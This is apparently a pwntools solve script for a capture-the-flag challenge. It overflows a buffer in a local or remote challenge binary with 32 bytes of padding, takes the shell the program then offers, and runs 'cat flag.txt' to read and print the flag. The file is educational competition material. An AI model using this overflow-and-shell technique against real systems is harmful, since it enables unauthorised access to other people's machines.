#!/usr/bin/env python3
from pwn import *
# context.log_level = "debug"
elf = context.binary = ELF("distrib/src")
if args.REMOTE:
    io = remote("challenge2.whitehacks.whitehats.live", 8005)
else:
    io = elf.process()
buffer = b"A"*(16+8+8)
io.sendlineafter(b"Your Input:", buffer)
io.sendlineafter(b"Your Choice:", b"N")
#at this point, we have a shell, get flag
io.sendlineafter(b"Here's a shell for you!\n", b"cat flag.txt; echo")
flag = io.recvline_regexS("WH2023{.*}").rpartition(" ")[-1]
log.success(f"Flag: {flag}")
io.close()
